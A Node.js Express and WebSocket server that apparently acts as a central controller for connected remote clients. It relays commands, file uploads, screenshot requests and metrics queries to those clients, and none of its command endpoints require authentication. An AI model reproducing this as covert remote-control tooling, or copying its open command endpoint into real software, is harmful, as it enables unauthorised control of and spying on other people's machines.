const express = require('express')
const WebSocket = require('ws')
const http = require('http')
const {v4: uuidv4} = require('uuid')
const multer = require('multer')

const app = express()
const server = http.createServer(app)
const wss = new WebSocket.Server({server})
const upload = multer()

let clients = {}
let responseStore = {} // Store to hold client responses

app.use(express.json())
app.use(express.static('public'))

const requestFromClient = (clientId, type, data) => {
	const requestId = uuidv4()
	return new Promise((resolve, reject) => {
		const client = clients[clientId]
		if (!client) return reject('Client not found')

		// Store the promise resolvers in the response store
		responseStore[requestId] = {resolve, reject}

		client.send(JSON.stringify({type, requestId, data}), (error) => {
			if (error) {
				delete responseStore[requestId]
				return reject(error)
			}
		})
	})
}

app.post('/upload', upload.single('file'), async (req, res) => {
	const { clientId } = req.body,
		file = req.file
	console.log(clientId, file)
	try {
		const data = await requestFromClient(clientId, 'upload', file)
		res.send(data)
	} catch (error) {
		res.status(500).send(error)
	}
})

app.post('/command', async (req, res) => {
	const { clientId, command } = req.body
	try {
		const data = await requestFromClient(clientId, 'command', command)
		res.send(data)
	} catch (error) {
		res.status(500).send(error)
	}
})

app.post('/screenshot', async (req, res) => {
	const {clientId} = req.body
	try {
		const data = await requestFromClient(clientId, 'screenshot')
		res.send(data)
	} catch (error) {
		res.status(500).send(error)
	}
})

app.get('/clients', async (req, res) => {
	const metricsPromises = Object.keys(clients).map((clientId) =>
		requestFromClient(clientId, 'metrics')
			.then((data) => ({...data.metrics, clientId}))
			.catch((error) => ({clientId, error: error.message}))
	)

	try {
		const metrics = await Promise.all(metricsPromises)
		res.send(metrics)
	} catch (error) {
		res.status(500).send(error.message)
	}
})

wss.on('connection', (ws, req) => {
	const clientId = req.headers['sec-websocket-key']
	clients[clientId] = ws
	console.log('Client connected. Client ID:', clientId)

	ws.on('message', (message) => {
		const data = JSON.parse(message)
		console.log(`Received from ${clientId}:`, data)

		if (data.requestId && responseStore[data.requestId]) {
			responseStore[data.requestId].resolve(data)
			delete responseStore[data.requestId]
		} else 	console.log('Unexpected message or missing requestId:', data)
		
	})

	ws.on('close', () => {
		delete clients[clientId]
		console.log('Client disconnected. Client ID:', clientId)
	})
})

server.listen(3000, () => console.log('Server started on port 3000'))
